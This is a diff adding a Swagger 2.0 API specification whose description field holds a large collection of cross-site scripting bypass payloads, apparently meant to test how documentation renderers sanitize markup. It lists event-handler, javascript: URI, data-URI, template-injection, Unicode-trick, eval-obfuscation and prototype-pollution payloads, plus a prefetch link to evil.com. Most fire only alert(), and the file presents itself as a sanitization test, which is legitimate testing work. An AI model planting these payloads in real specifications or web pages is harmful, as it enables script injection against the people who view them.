@@ -1,0 +1,154 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Advanced XSS Bypass Collection
+  description: |
+    <h1>Advanced Sanitization Bypass Suite</h1>
+    
+    <!-- DOM Clobbering -->
+    <form id="location">
+      <input name="href" value="javascript:alert('DOM-Clobber')">
+    </form>
+    <a id="namedItem">Click me</a>
+    <form id="document">
+      <input name="cookie" value="hijacked">
+    </form>
+    
+    <!-- CSS-based attacks -->
+    <div style="animation: xss 1s ease-in-out;" onanimationend="alert('CSS-XSS')"></div>
+    <div style="transition: opacity 1s;" ontransitionend="alert('CSS-Transition')"></div>
+    <style>
+      @keyframes xss {
+        from { opacity: 0; }
+        to { opacity: 1; }
+      }
+      body:before {
+        content: "XSS";
+        animation: xss 1s;
+      }
+    </style>
+    
+    <!-- Template pollution -->
+    {{constructor.constructor('alert("Template-XSS")')()}}
+    ${alert('Template-Dollar')}
+    #{alert('Template-Hash')}
+    <%= alert('Template-ERB') %>
+    <% alert('Template-Percent') %>
+    {%raw%}{{alert('Template-Raw')}}{%endraw%}
+    
+    <!-- Unicode normalization bypass -->
+    <img src＝"x" onerror＝"alert('Unicode-XSS')">
+    <svg onload＝"alert('Unicode-SVG')">
+    <script>alert＝('Unicode-Script')</script>
+    <iframe src＝"javascript:alert('Unicode-Iframe')"></iframe>
+    
+    <!-- XML/XHTML namespace tricks -->
+    <svg xmlns="http://www.w3.org/2000/svg">
+      <script xmlns="http://www.w3.org/1999/xhtml">alert('Namespace-XSS')</script>
+    </svg>
+    <math xmlns="http://www.w3.org/1998/Math/MathML">
+      <script>alert('Math-XSS')</script>
+    </math>
+    
+    <!-- Data URI in CSS -->
+    <div style="background: url('data:text/html,<script>alert(1)</script>')"></div>
+    <div style="background-image: url(data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSkgeG1sbnM9aHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmc+PC9zdmc+)"></div>
+    
+    <!-- Meta tag hijacking -->
+    <meta name="referrer" content="no-referrer">
+    <meta name="viewport" content="width=device-width">
+    <meta charset="utf-8">
+    
+    <!-- Time-based attacks -->
+    <link rel="prefetch" href="javascript:alert('Prefetch-XSS')">
+    <link rel="dns-prefetch" href="//evil.com">
+    <link rel="preload" href="javascript:alert('Preload-XSS')">
+    
+    <!-- File upload tricks -->
+    <input type="file" accept=".js,.html">
+    <input type="file" webkitdirectory>
+    
+    <!-- Alternative encoding -->
+    <script>eval(String.fromCharCode(97,108,101,114,116,40,39,69,110,99,111,100,101,100,45,88,83,83,39,41))</script>
+    <script>setTimeout('alert("Timeout-XSS")', 1000)</script>
+    <script>setInterval('alert("Interval-XSS")', 5000)</script>
+    
+    <!-- Alternative quotes and delimiters -->
+    <img src='x' onerror='alert("Single-Quote")'>
+    <img src=x onerror=alert("No-Quote")>
+    <img src="x" onerror="alert(&quot;Entity-Quote&quot;)">
+    
+    <!-- Event delegation bypass -->
+    <div onclick="alert('Click-XSS')">Click anywhere</div>
+    <div onmouseover="alert('Hover-XSS')">Hover me</div>
+    <div oncontextmenu="alert('Context-XSS')">Right click</div>
+    
+    <!-- Alternative script contexts -->
+    <script type="text/javascript">alert('Type-JS')</script>
+    <script type="application/javascript">alert('Type-App')</script>
+    <script type="">alert('Type-Empty')</script>
+    
+    <!-- HTML5 semantic bypasses -->
+    <details open ontoggle="alert('Details-XSS')">
+      <summary>Click me</summary>
+      Hidden XSS payload
+    </details>
+    
+    <!-- Form-based bypasses -->
+    <form action="javascript:alert('Form-Action')">
+      <input type="submit" value="Submit">
+    </form>
+    <form method="GET" action="javascript:alert('Form-Method')">
+      <button type="submit">Submit</button>
+    </form>
+    
+    <!-- WebComponent bypasses -->
+    <custom-element onclick="alert('Custom-XSS')">Custom</custom-element>
+    <unknown-tag onload="alert('Unknown-XSS')">Unknown</unknown-tag>
+    
+    <!-- Mutation observer triggers -->
+    <div id="mutate">Original</div>
+    <script>
+      var observer = new MutationObserver(function() {
+        alert('Mutation-XSS');
+      });
+      observer.observe(document.getElementById('mutate'), {childList: true});
+      document.getElementById('mutate').innerHTML = 'Changed';
+    </script>
+    
+    <!-- Alternative execution contexts -->
+    <iframe srcdoc="<script>parent.alert('Srcdoc-XSS')</script>"></iframe>
+    <object data="data:text/html,<script>alert('Object-Data')</script>"></object>
+    <embed src="data:text/html,<script>alert('Embed-Data')</script>">
+    
+    <!-- Service Worker bypass -->
+    <script>
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('data:text/javascript,alert("SW-XSS")');
+      }
+    </script>
+    
+    <!-- Web Worker bypass -->
+    <script>
+      var worker = new Worker('data:text/javascript,alert("Worker-XSS")');
+    </script>
+    
+    <!-- Alternative event handlers -->
+    <body onhashchange="alert('Hash-XSS')">
+    <body onpopstate="alert('Pop-XSS')">
+    <body onstorage="alert('Storage-XSS')">
+    <body onbeforeunload="alert('Unload-XSS')">
+    
+    <!-- JSONP-style bypass -->
+    <script>
+      window.callback = function() { alert('JSONP-XSS'); };
+    </script>
+    <script src="data:text/javascript,callback()"></script>
+    
+    <!-- Prototype pollution -->
+    <script>
+      Object.prototype.polluted = 'alert("Prototype-XSS")';
+      eval(window.polluted);
+    </script>
+    
+    This payload tests advanced sanitization bypass techniques.
